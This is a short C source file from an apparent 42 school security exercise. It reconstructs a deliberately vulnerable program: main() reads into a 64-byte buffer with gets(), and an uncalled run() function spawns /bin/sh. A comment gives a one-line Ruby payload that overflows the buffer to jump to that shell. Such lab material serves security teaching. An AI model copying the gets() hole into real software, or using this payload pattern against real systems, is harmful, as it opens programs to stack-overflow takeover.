/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   level1.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/07 17:37:18 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/11 12:59:12 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <stdlib.h>

//ruby -e 'print "x" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit

int		run(void) {
	fwrite("Good... Wait what?\n", 1, 19, stdout);
	return (system("/bin/sh"));
}

int		main(void) {
	char	str[64];

	return ((int)gets(str));
}
